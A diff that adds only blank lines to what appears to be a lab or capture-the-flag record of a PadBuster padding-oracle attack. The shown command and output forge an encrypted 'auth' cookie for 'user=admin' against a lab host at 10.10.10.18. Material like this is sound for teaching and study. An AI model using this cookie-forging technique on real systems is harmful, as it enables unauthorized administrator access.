@@ -8,6 +8,7 @@ data: padbuster http://$TARGET_IP $COOKIE 8 -cookies $COOKIE_NAME=$COOKIE -encod
 output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2
   8 -cookies ''auth=vUTZknJSU7A%2BJ02NeAP2MingCdt8ctB2'' -encoding 0 -plaintext user=admin
 
+
   +-------------------------------------------+
 
   | PadBuster - v0.3.3                        |
@@ -18,6 +19,7 @@ output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt
 
   +-------------------------------------------+
 
+
   INFO: The original request returned the following
 
   [+] Status: 200
@@ -26,15 +28,20 @@ output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt
 
   [+] Content Length: 978
 
+
   INFO: Starting PadBuster Encrypt Mode
 
   [+] Number of Blocks: 2
 
+
   INFO: No error string was provided...starting response analysis
+
 
   *** Response Analysis Complete ***
 
+
   The following response signatures were returned:
+
 
   -------------------------------------------------------
 
@@ -47,6 +54,7 @@ output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt
   2 **    255     200     15      N/A
 
   -------------------------------------------------------
+
 
   Enter an ID that matches the error condition
 
@@ -62,9 +70,11 @@ output: 'root@kali:~# padbuster http://10.10.10.18 vUTZknJSU7A%2BJ02NeAP2MingCdt
 
   [+] Intermediate Bytes (HEX): 717bc86beb4fdefe
 
+
   -------------------------------------------------------
 
   ** Finished ***
+
 
   [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
 
@@ -125,3 +135,5 @@ Block 1 Results:
 [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
 -------------------------------------------------------
 ```
+
+
